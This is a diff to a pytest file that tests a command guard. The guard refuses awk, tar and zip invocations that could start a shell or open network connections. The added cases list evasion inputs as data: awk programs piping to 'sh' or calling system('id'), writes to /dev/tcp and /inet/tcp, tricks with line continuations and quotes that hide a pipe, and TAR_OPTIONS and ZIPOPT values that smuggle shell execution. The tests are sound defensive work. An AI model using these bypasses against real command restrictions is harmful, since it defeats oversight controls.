@@ -446,8 +446,7 @@ def popen(guard, command, check):
     ["awk", "-e", "BEGIN { print 1 }", "-e", 'BEGIN { system("id") }'],
     ["awk", '/"/ { system("id") }'], ["awk", '/"/ { print } END { system("id") }'],
     ["awk", 'BEGIN { f = "system"; @f("id") }'], ["awk", 'function f(x) { return x } BEGIN { @f(1) }'],
-    ["awk", 'BEGIN { printf "%s|%s\\n", 1, 2 }'], ["awk", 'BEGIN { x = "system(" }'],
-    ["awk", 'BEGIN { print "a|b" }'],
+    ["awk", 'BEGIN { x = "system(" }'],
     ["awk", 'BEGIN { print "x" > "/inet/tcp/0/example.com/80" }'], ["awk", 'BEGIN { print "x" > "/dev/tcp/example.com/80" }'],
     ["awk", "-f", "-"], ["awk", "-f", "/dev/stdin"], ["awk", "--file=-"], ["awk", "--file=/dev/stdin"],
     ["awk", "-f", "/dev/fd/0"], ["awk", "-f", "/proc/self/fd/0"], ["awk", "-i", "-"],
@@ -471,11 +470,51 @@ def test_an_awk_program_file_is_read_before_it_is_allowed(guard, tmp_path):
     popen(guard, ["awk", "-f", str(tmp_path)], refused)
 
 
+BS, NL = chr(92), chr(10)
+
+
+@pytest.mark.parametrize("command", [
+    # a ; or } inside a string must not end the print pipe pattern early
+    ["awk", 'BEGIN { print "id;" | "sh" }'], ["awk", 'print "}" | "cat"'], ["awk", 'BEGIN { printf "id;%s", NL | "sh" }'],
+    ["awk", 'BEGIN { print "a}b;c" | "sh" }'], ["awk", 'BEGIN { printf("%s;", x) | "sh" }'],
+    ["awk", 'BEGIN { print "id;" |& "sh" }'], ["awk", 'BEGIN { "id;" | getline x }'],
+    ["awk", 'BEGIN { "}" |& getline x }'],
+    # a backslash-newline continuation is joined before either check
+    ["awk", 'BEGIN { print "id" ' + BS + NL + '| "sh" }'], ["awk", 'BEGIN { system' + BS + NL + '("id") }'],
+    ["awk", 'BEGIN { "id" |' + BS + NL + ' getline x; print x }'],
+    ["awk", 'BEGIN { print "id" ' + BS + NL + ' | "sh" }'], ["awk", 'BEGIN { system ' + BS + NL + ' ("id") }'],
+    ["awk", 'BEGIN { "id" ' + BS + NL + ' | ' + BS + NL + ' getline x }'],
+    ["awk", 'BEGIN { print "id" ' + BS + chr(13) + NL + '| "sh" }'],
+    ["awk", 'BEGIN { print "id" | ' + BS + NL + '"sh" }'],
+    ["awk", 'BEGIN { y = x' + BS + NL + 'system("id") }'],
+    ["awk", 'BEGIN { print "a' + BS + '"b;" | "sh" }'], ["awk", 'BEGIN { print "a' + BS + BS + '" | "sh" }'],
+    # a quote inside a regex literal can pair with a later quote and hide the pipe from a reader of strings
+    ["awk", '/"/ { print "x" | "sh" }'], ["awk", '/"/ { "id" | getline x }'], ["awk", '/[^"]/ { print $0 |& "sh" }'],
+    ["awk", '/"/ { print "x"; print "id;" | "sh" }'],
+    # system(, @ and the network files are searched in the raw text, a string that holds them included
+    ["awk", 'BEGIN { x = "system(" }'], ["awk", 'BEGIN { y = "@load" }'], ["awk", 'BEGIN { z = "/inet/tcp/0/h/1" }'],
+    ["awk", 'BEGIN { z = "/dev/tcp/h/1" }'], ["awk", 'BEGIN { print "a" > "/inet4/tcp/0/h/1" }']])
+def test_awk_pipes_are_found_past_strings_and_continuations(guard, command):
+    popen(guard, command, refused)
+
+
+def test_an_awk_program_file_with_a_pipe_past_a_string_or_a_continuation_is_refused(guard, tmp_path):
+    for index, text in enumerate(['BEGIN { print "id;" | "sh" }\n', 'BEGIN { print "id" ' + BS + NL + '| "sh" }\n',
+                                  'BEGIN { system' + BS + NL + '("id") }\n']):
+        script = tmp_path / f"bad{index}.awk"
+        script.write_text(text, encoding="utf-8")
+        popen(guard, ["awk", "-f", str(script)], refused)
+
+
 @pytest.mark.parametrize("command", [
     ["awk", "{ print $1 }", "file"], ["awk", "-F,", "{ print $2 }", "file"], ["awk", "-v", "x=1", "BEGIN { print x }"],
     ["awk", "/a|b/ { print }"], ["awk", "$1 == 1 || $2 == 2 { n++ } END { print n }"],
     ["awk", '{ s += length($0) } END { printf "%d\\n", s }'], ["awk", 'BEGIN { print "system" }'],
-    ["awk", 'BEGIN { print "system" }'], ["awk", "--version"]])
+    ["awk", 'BEGIN { print "system" }'], ["awk", "--version"],
+    ["awk", 'BEGIN { printf "%s|%s\\n", 1, 2 }'], ["awk", 'BEGIN { print "a|b" }'],
+    ["awk", 'BEGIN { x = "a | getline" }'], ["awk", 'BEGIN { print "a;b}c" > "out" }'],
+    ["awk", '/"/ { print $1 }'], ["awk", '/"/ || /x/ { print "a" }'],
+    ["awk", 'BEGIN { print "a" ' + BS + NL + ', "b" }'], ["awk", 'BEGIN { print 1 ' + BS + NL + '}']])
 def test_awk_stays_usable_for_local_work(guard, command):
     popen(guard, command, allowed)
 
@@ -547,6 +586,23 @@ def test_tar_reads_a_remote_archive_or_shell_from_its_environment_so_those_names
     allowed(guard, "subprocess.Popen", ("tar", ["tar", "-x"], None, KEEPS_GUARD))
 
 
+@pytest.mark.parametrize("name", ["TAR_OPTIONS", "tar_options", "Tar_Options"])
+@pytest.mark.parametrize("value", ["--to-command=sh", "--use-compress-program=sh", "--checkpoint=1 --checkpoint-action=exec=sh", ""])
+def test_tar_reads_options_from_tar_options_so_that_name_is_refused(guard, name, value):
+    """GNU tar puts TAR_OPTIONS in front of its command line, so it can carry `--to-command` and the other options
+    that start a program without any of them appearing in the words the guard reads."""
+    environment = {**KEEPS_GUARD, name: value}
+    refused(guard, "subprocess.Popen", ("tar", ["tar", "-xf", "a.tar"], None, environment))
+    refused(guard, "subprocess.Popen", ("tar", ["tar", "-x"], None, environment))
+    refused(guard, "subprocess.Popen", ("env", ["env", "tar", "-xf", "a.tar"], None, environment))
+    refused(guard, "subprocess.Popen", ("env", [f"env", f"{name}={value}", "tar", "-xf", "a.tar"], None, KEEPS_GUARD))
+    refused(guard, "os.exec", ("tar", ["tar", "-xf", "a.tar"], environment))
+    allowed(guard, "subprocess.Popen", ("env", ["env", "-u", name, "tar", "-xf", "a.tar"], None, environment))
+    allowed(guard, "subprocess.Popen", ("env", ["env", "-i", "tar", "-xf", "a.tar"], None, environment))
+    allowed(guard, "subprocess.Popen", ("tar", ["tar", "-xf", "a.tar"], None, KEEPS_GUARD))
+    allowed(guard, "subprocess.Popen", ("ls", ["ls"], None, environment))
+
+
 def test_tar_with_an_environment_the_guard_cannot_read_is_refused(guard):
     refused(guard, "subprocess.Popen", ("tar", ["tar", "-x"], None, 42))
 
@@ -588,6 +644,23 @@ def test_zip_cannot_start_an_unzip_command(guard, command):
     popen(guard, command, refused)
 
 
+@pytest.mark.parametrize("name", ["ZIPOPT", "zipopt", "Zipopt"])
+@pytest.mark.parametrize("value", ["-TT sh", "-TTsh", "--unzip-command=sh", ""])
+def test_zip_reads_options_from_zipopt_so_that_name_is_refused(guard, name, value):
+    """zip puts ZIPOPT in front of its command line, so it can carry -TT without the guard seeing it in the words."""
+    environment = {**KEEPS_GUARD, name: value}
+    refused(guard, "subprocess.Popen", ("zip", ["zip", "-T", "a.zip", "x"], None, environment))
+    refused(guard, "subprocess.Popen", ("zip", ["zip", "a.zip", "x"], None, environment))
+    refused(guard, "subprocess.Popen", ("env", ["env", "zip", "a.zip", "x"], None, environment))
+    refused(guard, "subprocess.Popen", ("env", ["env", f"{name}={value}", "zip", "a.zip", "x"], None, KEEPS_GUARD))
+    refused(guard, "os.exec", ("zip", ["zip", "a.zip", "x"], environment))
+    refused(guard, "subprocess.Popen", ("zip", ["zip", "a.zip", "x"], None, 42))
+    allowed(guard, "subprocess.Popen", ("env", ["env", "-u", name, "zip", "a.zip", "x"], None, environment))
+    allowed(guard, "subprocess.Popen", ("env", ["env", "-i", "zip", "a.zip", "x"], None, environment))
+    allowed(guard, "subprocess.Popen", ("zip", ["zip", "a.zip", "x"], None, KEEPS_GUARD))
+    allowed(guard, "subprocess.Popen", ("unzip", ["unzip", "-t", "a.zip"], None, environment))
+
+
 @pytest.mark.parametrize("command", [
     ["zip", "a.zip", "x"], ["zip", "-r", "a.zip", "dir"], ["zip", "-rq", "a.zip", "dir"], ["zip", "-T", "a.zip"],
     ["zip", "-9", "-j", "a.zip", "x"], ["zip", "-x", "*.tmp", "-r", "a.zip", "dir"],
@@ -601,6 +674,17 @@ def test_the_docstring_names_the_options_it_reads_through():
     text = GUARD_FILE.read_text(encoding="utf-8").split('"""')[1]
     for phrase in ("awk", "sed", "tar", "sort", "zip"):
         assert phrase in text, phrase
+
+
+def test_the_pwsh_check_says_it_admits_any_temporary_script_like_bash_c():
+    """pwsh -File runs whatever the file holds, which is the same accepted blind spot as bash -c."""
+    check = load_guard()._check_pwsh.__doc__
+    module = GUARD_FILE.read_text(encoding="utf-8").split('"""')[1]
+    for text in (check, module):
+        flat = " ".join(text.split())
+        assert "admits any temporary script" in flat, flat
+        assert "the same accepted blind spot as bash -c" in flat, flat
+    assert "only for the release paste tests" not in " ".join(check.split())
 
 
 def test_the_docstring_names_what_the_guard_cannot_see():
